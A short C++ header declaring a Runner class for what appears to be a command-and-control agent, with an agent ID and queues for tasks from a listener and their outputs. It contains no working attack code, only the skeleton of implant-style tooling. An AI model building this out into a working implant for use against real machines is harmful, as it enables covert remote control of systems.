#pragma once
#include <Windows.h>
#include "utils/winapi.h"
#include "utils/queue.h"

class Runner
{
private:
    WinApiCustom winApiCustom; // Manages WinAPI stuff
    PCHAR pAgentId;            // Agent ID; self-generated
    Queue TaskOutputQueue;     // Outputs from tasks execution are stored here
    Queue TaskInputQueue;      // Tasks from Listener are stored here
public:
    Runner();
    ~Runner();
    void Run();
};
